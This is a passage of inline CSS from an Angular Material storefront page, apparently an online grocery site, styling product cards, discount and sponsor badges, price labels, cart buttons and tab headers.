      .mat-mdc-tab-header-pagination-before .mat-mdc-tab-header-pagination-chevron,
      .mat-mdc-tab-header-rtl .mat-mdc-tab-header-pagination-after .mat-mdc-tab-header-pagination-chevron {
        transform: rotate(-135deg)
      }

      .mat-mdc-tab-header-rtl .mat-mdc-tab-header-pagination-before,
      .mat-mdc-tab-header-pagination-after {
        padding-right: 4px
      }

      .mat-mdc-tab-header-rtl .mat-mdc-tab-header-pagination-before .mat-mdc-tab-header-pagination-chevron,
      .mat-mdc-tab-header-pagination-after .mat-mdc-tab-header-pagination-chevron {
        transform: rotate(45deg)
      }

      .mat-mdc-tab-header-pagination-chevron {
        border-style: solid;
        border-width: 2px 2px 0 0;
        height: 8px;
        width: 8px
      }

      .mat-mdc-tab-header-pagination-disabled {
        box-shadow: none;
        cursor: default;
        pointer-events: none
      }

      .mat-mdc-tab-header-pagination-disabled .mat-mdc-tab-header-pagination-chevron {
        opacity: .4
      }

      .mat-mdc-tab-list {
        flex-grow: 1;
        position: relative;
        transition: transform 500ms cubic-bezier(0.35, 0, 0.25, 1)
      }

      ._mat-animation-noopable .mat-mdc-tab-list {
        transition: none
      }

      ._mat-animation-noopable span.mdc-tab-indicator__content,
      ._mat-animation-noopable span.mdc-tab__text-label {
        transition: none
      }

      .mat-mdc-tab-label-container {
        display: flex;
        flex-grow: 1;
        overflow: hidden;
        z-index: 1
      }

      .mat-mdc-tab-labels {
        display: flex;
        flex: 1 0 auto
      }

      [mat-align-tabs=center]>.mat-mdc-tab-header .mat-mdc-tab-labels {
        justify-content: center
      }

      [mat-align-tabs=end]>.mat-mdc-tab-header .mat-mdc-tab-labels {
        justify-content: flex-end
      }

      .mat-mdc-tab::before {
        margin: 5px
      }

      .cdk-high-contrast-active .mat-mdc-tab[aria-disabled=true] {
        color: GrayText
      }
    </style>
    <style>
      @keyframes spin {
        0% {
          transform: rotate(0)
        }

        to {
          transform: rotate(360deg)
        }
      }

      @keyframes presence {
        0% {
          opacity: 0
        }

        to {
          opacity: 1
        }
      }

      sm-list-page-item {
        display: block;
        --font-color__grey: var(--basicColor900)
      }

      sm-list-page-item .mdc-card {
        height: 22rem;
        padding: .5rem;
        justify-content: space-between;
        border-radius: 0;
        border: solid 1px rgba(0, 0, 0, .12);
        box-shadow: none !important;
        display: flex
      }

      @media (min-width: 992px) {
        sm-list-page-item .mdc-card {
          border-radius: 8px
        }
      }

      sm-list-page-item .mdc-card:hover {
        box-shadow: 0 0 9px #00000014
      }

      sm-list-page-item .mdc-card fe-product-image a {
        position: relative
      }

      sm-list-page-item .mdc-card.sponsored {
        border-color: var(--brandColorHemen500)
      }

      sm-list-page-item .mdc-card .favourite-container {
        position: relative
      }

      sm-list-page-item .mdc-card .favourite {
        position: absolute;
        z-index: 1;
        top: .15rem;
        right: .5rem;
        font-size: 1.25rem;
        cursor: pointer
      }

      sm-list-page-item .mdc-card .favourite--empty {
        color: var(--basicColor400)
      }

      sm-list-page-item .mdc-card .favourite--full {
        color: var(--brandColorError600)
      }

      sm-list-page-item .mdc-card .cross-badge {
        display: flex;
        align-self: start;
        z-index: 1;
        padding: .125rem .375rem;
        border-radius: 4px;
        background-color: var(--systemColorSuccess600)
      }

      sm-list-page-item .mdc-card .discount-badge,
      sm-list-page-item .mdc-card .new-badge {
        position: absolute;
        z-index: 1;
        top: 2.25rem;
        left: .5rem;
        padding: .3rem 0;
        border-radius: 50%;
        width: 2.7rem;
        height: 2.7rem;
        background-color: var(--brandColorMigroskop700);
        font-size: .5rem;
        font-weight: 700;
        letter-spacing: -.3px;
        line-height: normal;
        text-align: center
      }

      sm-list-page-item .mdc-card .discount-badge--percent,
      sm-list-page-item .mdc-card .new-badge--percent {
        font-size: .5rem;
        margin-right: 1px
      }

      sm-list-page-item .mdc-card .discount-badge--unit,
      sm-list-page-item .mdc-card .new-badge--unit {
        font-size: .75rem
      }

      sm-list-page-item .mdc-card .discount-badge--label,
      sm-list-page-item .mdc-card .new-badge--label {
        letter-spacing: -.3px
      }

      sm-list-page-item .mdc-card .discount-badge.new-badge-down,
      sm-list-page-item .mdc-card .new-badge.new-badge-down {
        top: 5.5rem
      }

      sm-list-page-item .mdc-card .discount-badge.badge-down,
      sm-list-page-item .mdc-card .new-badge.badge-down {
        top: 2.5rem;
        width: 2.4rem;
        height: 2.4rem;
        font-size: .5rem;
        letter-spacing: -.4px
      }

      sm-list-page-item .mdc-card .special-badge {
        position: absolute;
        z-index: 1;
        top: .5rem;
        left: .5rem;
        width: 2.5rem;
        height: 2.5rem;
        border-radius: 50%;
        background-image: linear-gradient(to bottom, #e45637, #b0257c);
        font-size: .625rem;
        font-weight: 900;
        line-height: normal;
        letter-spacing: -.5px;
        text-align: center
      }

      sm-list-page-item .mdc-card .special-badge span {
        margin-top: 18%;
        display: inline-block
      }

      sm-list-page-item .mdc-card .special-badge.badge-up {
        top: .2rem;
        width: 2.25rem;
        height: 2.25rem;
        font-size: .6rem
      }

      sm-list-page-item .mdc-card .delist-badge {
        position: absolute;
        z-index: 1;
        top: 2.25rem;
        left: .5rem;
        padding: .3rem 0;
        border-radius: 50%;
        width: 2.725rem;
        height: 2.725rem;
        background-color: var(--brandColorError600);
        font-size: .45rem;
        letter-spacing: -.35px;
        line-height: normal;
        text-align: center
      }

      sm-list-page-item .mdc-card .delist-badge span {
        position: relative;
        top: .435rem
      }

      sm-list-page-item .mdc-card .delist-badge.badge-deep {
        top: 5rem
      }

      sm-list-page-item .mdc-card .sponsor-badge {
        position: absolute;
        z-index: 1;
        top: 11.25rem;
        left: .25rem;
        width: 4rem;
        height: 1rem;
        border-radius: .4rem;
        background-color: var(--basicColor50);
        font-size: .625rem;
        font-weight: 500;
        text-align: center;
        color: var(--basicColor600)
      }

      sm-list-page-item .mdc-card .sponsor-badge span {
        margin-top: 18%;
        display: inline-block
      }

      sm-list-page-item .mdc-card .sponsor-badge.badge-up {
        top: .2rem;
        width: 2.25rem;
        height: 2.25rem;
        font-size: .6rem
      }

      sm-list-page-item .mdc-card .image {
        align-self: center;
        height: 10.75rem;
        width: auto
      }

      sm-list-page-item .mdc-card .image .variant-badge {
        position: absolute;
        bottom: 4px;
        right: 0;
        width: 1.75rem;
        height: 1.25rem;
        border: 1px solid var(--basicColor300);
        border-radius: 4px
      }

      sm-list-page-item .mdc-card .image .variant-badge div {
        position: relative;
        display: flex;
        align-items: center;
        height: 100%;
        width: 100%
      }

      sm-list-page-item .mdc-card .image .variant-badge div div:nth-child(1) {
        position: absolute;
        width: .875rem;
        height: .875rem;
        border-radius: 50%;
        background: linear-gradient(#20cdf3, #b14eff);
        left: 2px
      }

      sm-list-page-item .mdc-card .image .variant-badge div div:nth-child(2) {
        position: absolute;
        width: 1rem;
        height: 1rem;
        border-radius: 50%;
        border: 1px solid var(--basicColorWhite);
        background: linear-gradient(#19c889, #24caef);
        right: 1px
      }

      sm-list-page-item .mdc-card .product-name {
        display: block;
        margin-top: .5rem;
        overflow: hidden;
        text-overflow: ellipsis;
        white-space: initial;
        display: -webkit-box;
        -webkit-line-clamp: 2;
        -webkit-box-orient: vertical
      }

      sm-list-page-item .mdc-card .bottom-row {
        width: 100%;
        display: flex;
        flex-direction: column;
        flex: 1;
        flex-wrap: wrap
      }

      sm-list-page-item .mdc-card .bottom-row .stock-out-message {
        font-size: .625rem;
        color: var(--brandColorError600)
      }

      sm-list-page-item .mdc-card .bottom-row fe-crm-discount-badge {
        width: 100%;
        margin: .5rem 0
      }

      sm-list-page-item .mdc-card .bottom-row .price {
        display: flex;
        flex-direction: column;
        align-items: flex-start;
        flex: 1
      }

      @media (max-width: 992px) {
        sm-list-page-item .mdc-card .bottom-row .price {
          height: 3.75rem
        }
      }

      sm-list-page-item .mdc-card .bottom-row .actions {
        display: flex;
        justify-content: flex-end;
        margin-top: .25rem;
        width: 100%;
        height: 2rem
      }

      sm-list-page-item .mdc-card .bottom-row .actions .add-to-cart-button {
        width: 2rem
      }

      sm-list-page-item .mdc-card .bottom-row .actions .product-actions {
        width: 100%;
        height: 100%;
        border: solid .9px var(--brandColorPrimary700)
      }

      sm-list-page-item .mdc-card .bottom-row .actions .product-actions button {
        background-color: var(--brandColorTransparentPrimary8)
      }

      sm-list-page-item .mdc-card .bottom-row .actions .product-actions button fa-icon {
        font-size: 1rem;
        color: var(--brandColorPrimary700)
      }

      sm-list-page-item .mdc-card .bottom-row .actions .product-actions .product-amount {
        width: 100%;
        display: flex;
        justify-content: center
      }

      sm-list-page-item .mdc-card .bottom-row .actions .product-actions .product-amount .unit {
        margin-left: .25rem;
        font-size: .75rem;
        font-weight: 600;
        font-stretch: normal;
        font-style: normal;
        line-height: 1.33;
        letter-spacing: normal;
        color: var(--basicColor900)
      }

      .hemen sm-list-page-item .mdc-card .bottom-row .actions .product-actions {
        border-color: var(--basicColor900)
      }

      .hemen sm-list-page-item .mdc-card .bottom-row .actions .product-actions button fa-icon {
        color: var(--basicColor900)
      }

      .mion sm-list-page-item .mdc-card .favourite--full {
        color: var(--basicColorPink)
      }
    </style>
    <style>
      .mdc-elevation-overlay {
        position: absolute;
        border-radius: inherit;
        pointer-events: none;
        opacity: var(--mdc-elevation-overlay-opacity, 0);
        transition: opacity 280ms cubic-bezier(0.4, 0, 0.2, 1)
      }

      .mdc-card {
        border-radius: var(--mdc-shape-medium, 4px);
        position: relative;
        display: flex;
        flex-direction: column;
        box-sizing: border-box
      }

      .mdc-card .mdc-elevation-overlay {
        width: 100%;
        height: 100%;
        top: 0;
        left: 0
      }

      .mdc-card::after {
        border-radius: var(--mdc-shape-medium, 4px);
        position: absolute;
        box-sizing: border-box;
        width: 100%;
        height: 100%;
        top: 0;
        left: 0;
        border: 1px solid rgba(0, 0, 0, 0);
        border-radius: inherit;
        content: "";
        pointer-events: none;
        pointer-events: none
      }

      @media screen and (forced-colors: active) {
        .mdc-card::after {
          border-color: CanvasText
        }
      }

      .mdc-card--outlined {
        border-width: 1px;
        border-style: solid
      }

      .mdc-card--outlined::after {
        border: none
      }

      .mdc-card__content {
        border-radius: inherit;
        height: 100%
      }

      .mdc-card__media {
        position: relative;
        box-sizing: border-box;
        background-repeat: no-repeat;
        background-position: center;
        background-size: cover
      }

      .mdc-card__media::before {
        display: block;
        content: ""
      }

      .mdc-card__media:first-child {
        border-top-left-radius: inherit;
        border-top-right-radius: inherit
      }

      .mdc-card__media:last-child {
        border-bottom-left-radius: inherit;
        border-bottom-right-radius: inherit
      }

      .mdc-card__media--square::before {
        margin-top: 100%
      }

      .mdc-card__media--16-9::before {
        margin-top: 56.25%
      }

      .mdc-card__media-content {
        position: absolute;
        top: 0;
        right: 0;
        bottom: 0;
        left: 0;
        box-sizing: border-box
      }

      .mdc-card__primary-action {
        display: flex;
        flex-direction: column;
        box-sizing: border-box;
        position: relative;
        outline: none;
        color: inherit;
        text-decoration: none;
        cursor: pointer;
        overflow: hidden
      }

      .mdc-card__primary-action:first-child {
        border-top-left-radius: inherit;
        border-top-right-radius: inherit
      }

      .mdc-card__primary-action:last-child {
        border-bottom-left-radius: inherit;
        border-bottom-right-radius: inherit
      }

      .mdc-card__actions {
        display: flex;
        flex-direction: row;
        align-items: center;
        box-sizing: border-box;
        min-height: 52px;
        padding: 8px
      }

      .mdc-card__actions--full-bleed {
        padding: 0
      }

      .mdc-card__action-buttons,
      .mdc-card__action-icons {
        display: flex;
        flex-direction: row;
        align-items: center;
        box-sizing: border-box
      }

      .mdc-card__action-icons {
        flex-grow: 1;
        justify-content: flex-end
      }

      .mdc-card__action-buttons+.mdc-card__action-icons {
        margin-left: 16px;
        margin-right: 0
      }

      [dir=rtl] .mdc-card__action-buttons+.mdc-card__action-icons,
      .mdc-card__action-buttons+.mdc-card__action-icons[dir=rtl] {
        margin-left: 0;
        margin-right: 16px
      }

      .mdc-card__action {
        display: inline-flex;
        flex-direction: row;
        align-items: center;
        box-sizing: border-box;
        justify-content: center;
        cursor: pointer;
        user-select: none
      }

      .mdc-card__action:focus {
        outline: none
      }

      .mdc-card__action--button {
        margin-left: 0;
        margin-right: 8px;
        padding: 0 8px
      }

      [dir=rtl] .mdc-card__action--button,
      .mdc-card__action--button[dir=rtl] {
        margin-left: 8px;
        margin-right: 0
      }

      .mdc-card__action--button:last-child {
        margin-left: 0;
        margin-right: 0
      }

      [dir=rtl] .mdc-card__action--button:last-child,
      .mdc-card__action--button:last-child[dir=rtl] {
        margin-left: 0;
        margin-right: 0
      }

      .mdc-card__actions--full-bleed .mdc-card__action--button {
        justify-content: space-between;
        width: 100%;
        height: auto;
        max-height: none;
        margin: 0;
        padding: 8px 16px;
        text-align: left
      }

      [dir=rtl] .mdc-card__actions--full-bleed .mdc-card__action--button,
      .mdc-card__actions--full-bleed .mdc-card__action--button[dir=rtl] {
        text-align: right
      }

      .mdc-card__action--icon {
        margin: -6px 0;
        padding: 12px
      }

      .mat-mdc-card-title,
      .mat-mdc-card-subtitle {
        display: block;
        margin: 0
      }

      .mat-mdc-card-avatar~.mat-mdc-card-header-text .mat-mdc-card-title,
      .mat-mdc-card-avatar~.mat-mdc-card-header-text .mat-mdc-card-subtitle {
        padding: 16px 16px 0
      }

      .mat-mdc-card-header {
        display: flex;
        padding: 16px 16px 0
      }

      .mat-mdc-card-header .mat-mdc-card-subtitle {
        margin-top: -8px;
        margin-bottom: 16px
      }

      .mat-mdc-card-content {
        display: block;
        padding: 0 16px
      }

      .mat-mdc-card-content:first-child {
        padding-top: 16px
      }

      .mat-mdc-card-content:last-child {
        padding-bottom: 16px
      }

      .mat-mdc-card-title-group {
        display: flex;
        justify-content: space-between;
        padding: 16px 16px 0
      }

      .mat-mdc-card-avatar {
        height: 40px;
        width: 40px;
        border-radius: 50%;
        flex-shrink: 0;
        object-fit: cover
      }

      .mat-mdc-card-sm-image {
        width: 80px;
        height: 80px
      }

      .mat-mdc-card-md-image {
        width: 112px;
        height: 112px
      }

      .mat-mdc-card-lg-image {
        width: 152px;
        height: 152px
      }

      .mat-mdc-card-xl-image {
        width: 240px;
        height: 240px
      }

      .mat-mdc-card-subtitle~.mat-mdc-card-title,
      .mat-mdc-card-title~.mat-mdc-card-subtitle,
      .mat-mdc-card-header .mat-mdc-card-header-text .mat-mdc-card-title,
      .mat-mdc-card-header .mat-mdc-card-header-text .mat-mdc-card-subtitle,
      .mat-mdc-card-title-group .mat-mdc-card-title,
      .mat-mdc-card-title-group .mat-mdc-card-subtitle {
        padding-top: 0
      }

      .mat-mdc-card-content>:last-child:not(.mat-mdc-card-footer) {
        margin-bottom: 0
      }

      .mat-mdc-card-actions-align-end {
        justify-content: flex-end
      }
    </style>
    <style>
      [_nghost-isc-c162] {
        display: block
      }

      a[_ngcontent-isc-c162] {
        display: block;
        height: 100%;
        border-radius: inherit
      }

      a[_ngcontent-isc-c162] img[_ngcontent-isc-c162] {
        width: 100%;
        height: 100%;
        border-radius: inherit;
        object-fit: contain
      }
    </style>
    <style>
      [_nghost-isc-c343] {
        display: inherit
      }

      .crm-badge[_ngcontent-isc-c343] {
        display: inline-block;
        height: max-content;
        color: var(--crm-badge-color);
        background-color: var(--crm-badge-bg-color);
        border-radius: 0 6.25rem 6.25rem 0;
        padding: .125rem .5rem;
        text-align: center;
        position: relative;
        white-space: nowrap;
        overflow: hidden;
        text-overflow: ellipsis;
        max-width: 100%
      }

      .crm-badge[_ngcontent-isc-c343] img[_ngcontent-isc-c343] {
        position: absolute;
        top: 0;
        left: 0
      }
    </style>
    <style>
      @keyframes spin {
        0% {
          transform: rotate(0)
        }

        to {
          transform: rotate(360deg)
        }
      }

      @keyframes presence {
        0% {
          opacity: 0
        }

        to {
          opacity: 1
        }
      }

      [_nghost-isc-c275] {
        display: block;
        position: relative
      }

      [not-in-sale=true][_nghost-isc-c275] .price-new[_ngcontent-isc-c275] {
        color: var(--font-color__grey)
      }

      [not-in-sale=true][_nghost-isc-c275] .price-old[_ngcontent-isc-c275] {
        display: none
      }

      @media (min-width: 768px) {
        [not-in-sale=true][_nghost-isc-c275] .price-old[_ngcontent-isc-c275] {
          display: inline-block
        }
      }

      .amount[_ngcontent-isc-c275] {
        font-weight: var(--font-weight-bolder)
      }

      .currency[_ngcontent-isc-c275] {
        font-size: 14px
      }

      .price-old[_ngcontent-isc-c275] {
        font-size: var(--product-old-price-label-font-size);
        color: var(--font-color__grey);
        text-decoration: line-through
      }

      @media (max-width: 768px) {
        .price-old[_ngcontent-isc-c275] {
          font-size: 14px
        }
      }

      .price-old[_ngcontent-isc-c275] .currency[_ngcontent-isc-c275] {
        font-size: inherit;
        display: inline
      }

      .price-new[_ngcontent-isc-c275] {
        color: var(--product-price-label-color);
        margin-bottom: 3px
      }

      @media (max-width: 768px) {
        .price-new[_ngcontent-isc-c275] {
          font-size: 18px
        }
      }

      @media (min-width: 768px) {
        .price-new[_ngcontent-isc-c275] {
          flex-direction: unset;
          justify-content: space-between
        }
      }

      @media (max-width: 768px) {
        .price-new-only[_ngcontent-isc-c275] {
          font-size: var(--product-new-only-price-label-font-size);
          margin-top: 8px
        }
      }

      .promotion-wrapper[_ngcontent-isc-c275] {
        background: url(assets/images/yellow-discount-label.svg) no-repeat;
        background-size: 100%;
        display: inline-block;
        padding: .125rem 1rem 0 .5rem
      }

      .promotion-wrapper[_ngcontent-isc-c275] span[_ngcontent-isc-c275] {
        display: inline-block;
        max-width: 100%;
        overflow: hidden;
        text-overflow: ellipsis;
        white-space: nowrap
      }

      .promotion-wrapper[_ngcontent-isc-c275] .amount[_ngcontent-isc-c275] {
        line-height: 1
      }

      .promotion-wrapper[_ngcontent-isc-c275] .price-new[_ngcontent-isc-c275] {
        color: var(--product-price-new-label-color, var(--product-price-label-color))
      }

      .promotion-wrapper[_ngcontent-isc-c275] .price-new[_ngcontent-isc-c275] .currency[_ngcontent-isc-c275] {
        font-size: var(--product-old-price-label-font-size)
      }

      .promotion-wrapper[_ngcontent-isc-c275] .price-old[_ngcontent-isc-c275] .amount[_ngcontent-isc-c275] {
        display: block
      }

      .elektronik[_nghost-isc-c275],
      .elektronik [_nghost-isc-c275] {
        --product-price-label-color: var(--brandColorInfo700)
      }

      .hemen[_nghost-isc-c275],
      .hemen [_nghost-isc-c275] {
        --product-price-label-color: var(--basicColor900)
      }

      .yemek[_nghost-isc-c275] .promotion-wrapper[_ngcontent-isc-c275],
      .yemek [_nghost-isc-c275] .promotion-wrapper[_ngcontent-isc-c275] {
        background: none
      }

      .yemek[_nghost-isc-c275] .promotion-wrapper[_ngcontent-isc-c275] .price-old[_ngcontent-isc-c275] .amount[_ngcontent-isc-c275],
      .yemek [_nghost-isc-c275] .promotion-wrapper[_ngcontent-isc-c275] .price-old[_ngcontent-isc-c275] .amount[_ngcontent-isc-c275] {
        color: var(--basicColor500)
      }

      .yemek[_nghost-isc-c275] .price-new[_ngcontent-isc-c275] .amount[_ngcontent-isc-c275],
      .yemek [_nghost-isc-c275] .price-new[_ngcontent-isc-c275] .amount[_ngcontent-isc-c275] {
        color: var(--basicColor900);
        white-space: nowrap
      }

      @media (max-width: 992px) {

        .yemek[_nghost-isc-c275] .product-price[_ngcontent-isc-c275],
        .yemek [_nghost-isc-c275] .product-price[_ngcontent-isc-c275] {
          display: flex;
          flex-direction: row-reverse
        }
      }

      .unitPrice[_ngcontent-isc-c275] {
        color: var(--basicColor500);
        font-size: 10px;
        font-style: normal;
        font-weight: 600
      }

      .mion[_nghost-isc-c275] .price-new[_ngcontent-isc-c275] .amount[_ngcontent-isc-c275],
      .mion [_nghost-isc-c275] .price-new[_ngcontent-isc-c275] .amount[_ngcontent-isc-c275] {
        color: #141415
      }
    </style>
    <style>
      [_nghost-isc-c345] {
        display: block
      }

      .product-actions[_ngcontent-isc-c345] {
        display: inline-flex;
        align-items: center;
        border: 1px solid var(--basicColor100);
        border-radius: 5px;
        overflow: hidden;
        touch-action: manipulation
      }

      .product-actions[_ngcontent-isc-c345] button[_ngcontent-isc-c345] {
        background-color: var(--basicColor100);
        border: none;
        outline: 0;
        padding: .5rem;
        align-items: center;
        display: flex;
        cursor: pointer
      }

      .product-actions[_ngcontent-isc-c345] button[_ngcontent-isc-c345] fa-icon[_ngcontent-isc-c345] {
        font-size: .75rem
      }

      .product-actions[_ngcontent-isc-c345] .product-amount[_ngcontent-isc-c345] {
        padding: 0 .25rem;
        text-align: center;
        line-height: 1.25;
        width: 2rem
      }

      .product-actions[_ngcontent-isc-c345] .product-amount[_ngcontent-isc-c345] .amount[_ngcontent-isc-c345],
      .product-actions[_ngcontent-isc-c345] .product-amount[_ngcontent-isc-c345] .unit[_ngcontent-isc-c345] {
        display: block
      }

      .product-actions[_ngcontent-isc-c345] .product-amount[_ngcontent-isc-c345] .unit[_ngcontent-isc-c345] {
        font-size: .625rem
      }

      .add-to-cart-button[_ngcontent-isc-c345] {
        cursor: pointer;
        color: #fff;
        background-color: var(--brandColorPrimary700);
        text-align: center;
        align-self: flex-end;
        border-radius: 5px;
        box-shadow: 0 2px 10px #00000047;
        padding: .25rem .5rem
      }

      .add-to-cart-button.disabled[_ngcontent-isc-c345] {
        background-color: var(--basicColor300);
        cursor: not-allowed;
        pointer-events: none
      }

      .product-detail-add[_ngcontent-isc-c345] {
        height: 3.15rem;
        min-width: 10.8rem
      }

      .hemen[_nghost-isc-c345] .add-to-cart-button[_ngcontent-isc-c345],
      .hemen [_nghost-isc-c345] .add-to-cart-button[_ngcontent-isc-c345] {
        background-color: var(--basicColor900)
      }

      .yemek[_nghost-isc-c345] .product-actions[_ngcontent-isc-c345],
      .yemek [_nghost-isc-c345] .product-actions[_ngcontent-isc-c345] {
        background: var(--background-color__LIGHTER);
        border: 1px solid var(--brandColorYemek700);
        border-radius: .25rem
      }

      .yemek[_nghost-isc-c345] .product-decrease[_ngcontent-isc-c345],
      .yemek [_nghost-isc-c345] .product-decrease[_ngcontent-isc-c345],
      .yemek[_nghost-isc-c345] .product-increase[_ngcontent-isc-c345],
      .yemek [_nghost-isc-c345] .product-increase[_ngcontent-isc-c345] {
        background-color: var(--brandColorYemek50);
        color: var(--brandColorYemek700)
      }

      .yemek[_nghost-isc-c345] .product-amount[_ngcontent-isc-c345] span[_ngcontent-isc-c345]:last-of-type,
      .yemek [_nghost-isc-c345] .product-amount[_ngcontent-isc-c345] span[_ngcontent-isc-c345]:last-of-type {
        display: none
      }

      .mion[_nghost-isc-c345] .add-to-cart-button[_ngcontent-isc-c345],
      .mion [_nghost-isc-c345] .add-to-cart-button[_ngcontent-isc-c345] {
        background-color: var(--basicColor900);
        color: var(--basicColorYellow)
      }

      .mion[_nghost-isc-c345] .product-decrease[_ngcontent-isc-c345],
      .mion [_nghost-isc-c345] .product-decrease[_ngcontent-isc-c345],
      .mion[_nghost-isc-c345] .product-increase[_ngcontent-isc-c345],
      .mion [_nghost-isc-c345] .product-increase[_ngcontent-isc-c345] {
        background-color: var(--basicColor300) !important
      }

      .mion[_nghost-isc-c345] .product-decrease[_ngcontent-isc-c345] fa-icon[_ngcontent-isc-c345],
      .mion [_nghost-isc-c345] .product-decrease[_ngcontent-isc-c345] fa-icon[_ngcontent-isc-c345],
      .mion[_nghost-isc-c345] .product-increase[_ngcontent-isc-c345] fa-icon[_ngcontent-isc-c345],
      .mion [_nghost-isc-c345] .product-increase[_ngcontent-isc-c345] fa-icon[_ngcontent-isc-c345] {
        color: var(--basicColor900) !important
      }
    </style>
    <style>
      .mat-mdc-tab-body {
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        position: absolute;
        display: block;
        overflow: hidden;
        outline: 0;
        flex-basis: 100%
      }

      .mat-mdc-tab-body.mat-mdc-tab-body-active {
        position: relative;
        overflow-x: hidden;
        overflow-y: auto;
        z-index: 1;
        flex-grow: 1
      }

      .mat-mdc-tab-group.mat-mdc-tab-group-dynamic-height .mat-mdc-tab-body.mat-mdc-tab-body-active {
        overflow-y: hidden
      }

      .mat-mdc-tab-body-content {
        height: 100%;
        overflow: auto
      }

      .mat-mdc-tab-group-dynamic-height .mat-mdc-tab-body-content {
        overflow: hidden
      }

      .mat-mdc-tab-body-content[style*="visibility: hidden"] {
        display: none
      }
    </style>
    <style>
      .mdc-touch-target-wrapper {
        display: inline
      }

      .mdc-elevation-overlay {
        position: absolute;
        border-radius: inherit;
        pointer-events: none;
        opacity: var(--mdc-elevation-overlay-opacity, 0);
        transition: opacity 280ms cubic-bezier(0.4, 0, 0.2, 1)
      }

      .mdc-button {
        position: relative;
        display: inline-flex;
        align-items: center;
        justify-content: center;
        box-sizing: border-box;
        min-width: 64px;
        border: none;
        outline: none;
        line-height: inherit;
        user-select: none;
        -webkit-appearance: none;
        overflow: visible;
        vertical-align: middle;
        background: rgba(0, 0, 0, 0)
      }

      .mdc-button .mdc-elevation-overlay {
        width: 100%;
        height: 100%;
        top: 0;
        left: 0
      }

      .mdc-button::-moz-focus-inner {
        padding: 0;
        border: 0
      }

      .mdc-button:active {
        outline: none
      }

      .mdc-button:hover {
        cursor: pointer
      }

      .mdc-button:disabled {
        cursor: default;
        pointer-events: none
      }

      .mdc-button .mdc-button__icon {
        margin-left: 0;
        margin-right: 8px;
        display: inline-block;
        position: relative;
        vertical-align: top
      }

      [dir=rtl] .mdc-button .mdc-button__icon,
      .mdc-button .mdc-button__icon[dir=rtl] {
        margin-left: 8px;
        margin-right: 0
      }

      .mdc-button .mdc-button__label {
        position: relative
      }

      .mdc-button .mdc-button__focus-ring {
        display: none
      }

      @media screen and (forced-colors: active) {

        .mdc-button.mdc-ripple-upgraded--background-focused .mdc-button__focus-ring,
        .mdc-button:not(.mdc-ripple-upgraded):focus .mdc-button__focus-ring {
          pointer-events: none;
          border: 2px solid rgba(0, 0, 0, 0);
          border-radius: 6px;
          box-sizing: content-box;
          position: absolute;
          top: 50%;
          left: 50%;
          transform: translate(-50%, -50%);
          height: calc(100% + 4px);
          width: calc(100% + 4px);
          display: block
        }
      }

      @media screen and (forced-colors: active)and (forced-colors: active) {

        .mdc-button.mdc-ripple-upgraded--background-focused .mdc-button__focus-ring,
        .mdc-button:not(.mdc-ripple-upgraded):focus .mdc-button__focus-ring {
          border-color: CanvasText
        }
      }

      @media screen and (forced-colors: active) {

        .mdc-button.mdc-ripple-upgraded--background-focused .mdc-button__focus-ring::after,
        .mdc-button:not(.mdc-ripple-upgraded):focus .mdc-button__focus-ring::after {
          content: "";
          border: 2px solid rgba(0, 0, 0, 0);
          border-radius: 8px;
          display: block;
          position: absolute;
          top: 50%;
          left: 50%;
          transform: translate(-50%, -50%);
          height: calc(100% + 4px);
          width: calc(100% + 4px)
        }
      }

      @media screen and (forced-colors: active)and (forced-colors: active) {

        .mdc-button.mdc-ripple-upgraded--background-focused .mdc-button__focus-ring::after,
        .mdc-button:not(.mdc-ripple-upgraded):focus .mdc-button__focus-ring::after {
          border-color: CanvasText
        }
      }

      .mdc-button .mdc-button__touch {
        position: absolute;
        top: 50%;
        height: 48px;
        left: 0;
        right: 0;
        transform: translateY(-50%)
      }

      .mdc-button__label+.mdc-button__icon {
        margin-left: 8px;
        margin-right: 0
      }

      [dir=rtl] .mdc-button__label+.mdc-button__icon,
      .mdc-button__label+.mdc-button__icon[dir=rtl] {
        margin-left: 0;
        margin-right: 8px
      }

      svg.mdc-button__icon {
        fill: currentColor
      }

      .mdc-button--touch {
        margin-top: 6px;
        margin-bottom: 6px
      }

      .mdc-button {
        padding: 0 8px 0 8px
      }

      .mdc-button--unelevated {
        transition: box-shadow 280ms cubic-bezier(0.4, 0, 0.2, 1);
        padding: 0 16px 0 16px
      }

      .mdc-button--unelevated.mdc-button--icon-trailing {
        padding: 0 12px 0 16px
      }

      .mdc-button--unelevated.mdc-button--icon-leading {
        padding: 0 16px 0 12px
      }

      .mdc-button--raised {
        transition: box-shadow 280ms cubic-bezier(0.4, 0, 0.2, 1);
        padding: 0 16px 0 16px
      }

      .mdc-button--raised.mdc-button--icon-trailing {
        padding: 0 12px 0 16px
      }

      .mdc-button--raised.mdc-button--icon-leading {
        padding: 0 16px 0 12px
      }

      .mdc-button--outlined {
        border-style: solid;
        transition: border 280ms cubic-bezier(0.4, 0, 0.2, 1)
      }

      .mdc-button--outlined .mdc-button__ripple {
        border-style: solid;
        border-color: rgba(0, 0, 0, 0)
      }

      .mat-mdc-button {
        height: var(--mdc-text-button-container-height, 36px);
        border-radius: var(--mdc-text-button-container-shape, var(--mdc-shape-small, 4px))
      }

      .mat-mdc-button:not(:disabled) {
        color: var(--mdc-text-button-label-text-color, inherit)
      }

      .mat-mdc-button:disabled {
        color: var(--mdc-text-button-disabled-label-text-color, rgba(0, 0, 0, 0.38))
      }

      .mat-mdc-button .mdc-button__ripple {
        border-radius: var(--mdc-text-button-container-shape, var(--mdc-shape-small, 4px))
      }

      .mat-mdc-unelevated-button {
        height: var(--mdc-filled-button-container-height, 36px);
        border-radius: var(--mdc-filled-button-container-shape, var(--mdc-shape-small, 4px))
      }

      .mat-mdc-unelevated-button:not(:disabled) {
        background-color: var(--mdc-filled-button-container-color, transparent)
      }

      .mat-mdc-unelevated-button:disabled {
        background-color: var(--mdc-filled-button-disabled-container-color, rgba(0, 0, 0, 0.12))
      }

      .mat-mdc-unelevated-button:not(:disabled) {
        color: var(--mdc-filled-button-label-text-color, inherit)
      }

      .mat-mdc-unelevated-button:disabled {
        color: var(--mdc-filled-button-disabled-label-text-color, rgba(0, 0, 0, 0.38))
      }

      .mat-mdc-unelevated-button .mdc-button__ripple {
        border-radius: var(--mdc-filled-button-container-shape, var(--mdc-shape-small, 4px))
      }

      .mat-mdc-raised-button {
        height: var(--mdc-protected-button-container-height, 36px);
        border-radius: var(--mdc-protected-button-container-shape, var(--mdc-shape-small, 4px));
